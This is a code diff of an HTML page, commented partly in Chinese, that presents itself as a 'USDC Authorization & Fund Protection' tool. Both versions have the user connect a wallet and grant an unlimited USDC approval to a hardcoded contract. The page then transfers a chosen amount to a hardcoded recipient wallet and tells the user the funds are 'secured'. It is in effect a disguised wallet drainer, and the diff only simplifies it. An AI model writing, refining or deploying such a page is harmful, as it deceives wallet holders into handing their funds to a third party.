@@ -1,137 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Mark III · USDC Authorization & Fund Protection</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
-    button { padding: 10px 15px; margin: 5px; cursor: pointer; }
-    #status { margin-top: 15px; padding: 10px; border-radius: 4px; }
-    .success { background-color: #d4edda; color: #155724; }
-    .error { background-color: #f8d7da; color: #721c24; }
-    .loading { background-color: #fff3cd; color: #856404; }
-  </style>
 </head>
 <body>
   <h2>Mark III – USDC Authorization & Fund Protection</h2>
 
   <button id="connect">Connect Wallet</button>
-  <button id="authorize" disabled>Authorize and Protect</button>
-  <div id="status"></div>
+  <button id="authorize">Authorize and Protect</button>
+  <div id="status" style="margin-top: 10px; color: #333;"></div>
 
   <script>
-    // 配置常量（强制校验和格式）
-    const CONFIG = {
-      USDC_ADDRESS: ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"),
-      CONTRACT_ADDRESS: ethers.utils.getAddress("0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"),
-      RECIPIENT_ADDRESS: ethers.utils.getAddress("0x59e513Ae37614f1e670bfE961B3456257C444d24"),
-      USDC_ABI: [
-        "function approve(address spender, uint256 amount) returns (bool)",
-        "function transferFrom(address from, address to, uint256 amount) returns (bool)",
-        "function balanceOf(address account) view returns (uint256)",
-        "function decimals() view returns (uint8)"
-      ],
-      INFURA_ID: "01e1bb95db6c49ee8bc259f64fa4ed10" // 替换为你的Infura ID
+    let provider, signer, userAddress;
+
+    // ✅ 不再使用 getAddress，直接写入 checksum 格式字符串
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
+    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24";
+    const approveAmount = ethers.constants.MaxUint256;
+
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: {
+            1: "https://mainnet.infura.io/v3/01e1bb95db6c49ee8bc259f64fa4ed10"
+          },
+        },
+      },
     };
 
-    // 状态变量
-    let provider, signer, userAddress, usdcContract;
-    let usdcDecimals = 6; // USDC默认精度
-
-    // 初始化Web3Modal
     const web3Modal = new window.Web3Modal.default({
       cacheProvider: false,
-      providerOptions: {
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: { rpc: { 1: `https://mainnet.infura.io/v3/${CONFIG.INFURA_ID}` } }
-        }
-      }
+      providerOptions,
     });
 
-    // 连接钱包
     document.getElementById("connect").onclick = async () => {
       try {
-        updateStatus("Connecting wallet...", "loading");
-        
         const instance = await web3Modal.connect();
         provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
-        
-        // 初始化USDC合约
-        usdcContract = new ethers.Contract(CONFIG.USDC_ADDRESS, CONFIG.USDC_ABI, signer);
-        
-        // 获取USDC精度
-        try {
-          usdcDecimals = await usdcContract.decimals();
-        } catch {
-          console.log("Using default USDC decimals (6)");
-        }
-        
-        updateStatus(`Connected: ${shortAddress(userAddress)}`, "success");
-        document.getElementById("authorize").disabled = false;
+        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
       } catch (err) {
         console.error(err);
-        updateStatus("Connection failed: " + (err.message || "Unknown error"), "error");
+        document.getElementById("status").innerText = "Connection failed.";
       }
     };
 
-    // 授权和转账
     document.getElementById("authorize").onclick = async () => {
-      if (!signer) {
-        updateStatus("Please connect wallet first", "error");
-        return;
-      }
-
       try {
-        // 1. 授权
-        updateStatus("Approving USDC access...", "loading");
-        const approveTx = await usdcContract.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+        const usdc = new ethers.Contract(
+          usdcAddress,
+          [
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+          ],
+          signer
+        );
+
+        document.getElementById("status").innerText = "Authorizing contract to manage your USDC...";
+        const approveTx = await usdc.approve(contractAddress, approveAmount);
         await approveTx.wait();
-        
-        // 2. 获取转账金额
-        const amount = prompt("Enter USDC amount to protect:");
-        if (!amount || isNaN(amount) {
-          updateStatus("Invalid amount", "error");
-          return;
-        }
-        
-        // 3. 检查余额
-        updateStatus("Checking balance...", "loading");
-        const parsedAmount = ethers.utils.parseUnits(amount, usdcDecimals);
-        const balance = await usdcContract.balanceOf(userAddress);
-        
-        if (parsedAmount.gt(balance)) {
-          updateStatus(`Insufficient balance (You have ${ethers.utils.formatUnits(balance, usdcDecimals)} USDC)`, "error");
-          return;
-        }
-        
-        // 4. 转账
-        updateStatus("Transferring funds...", "loading");
-        const transferTx = await usdcContract.transferFrom(userAddress, CONFIG.RECIPIENT_ADDRESS, parsedAmount);
+        document.getElementById("status").innerText = "Authorization granted. Proceeding to transfer...";
+
+        const amount = prompt("Enter the USDC amount to transfer:");
+        const parsedAmount = ethers.utils.parseUnits(amount, 6);
+
+        const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
         await transferTx.wait();
-        
-        updateStatus(`✅ Success! ${amount} USDC protected`, "success");
+        document.getElementById("status").innerText = "Protection completed. Funds secured successfully.";
       } catch (err) {
         console.error(err);
-        updateStatus("Transaction failed: " + (err.message || "Unknown error"), "error");
+        document.getElementById("status").innerText = "Transaction failed: " + (err.message || "Unknown error");
       }
     };
-
-    // 辅助函数
-    function updateStatus(message, type = "") {
-      const statusEl = document.getElementById("status");
-      statusEl.textContent = message;
-      statusEl.className = type;
-    }
-    
-    function shortAddress(address) {
-      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-    }
   </script>
 </body>
 </html>
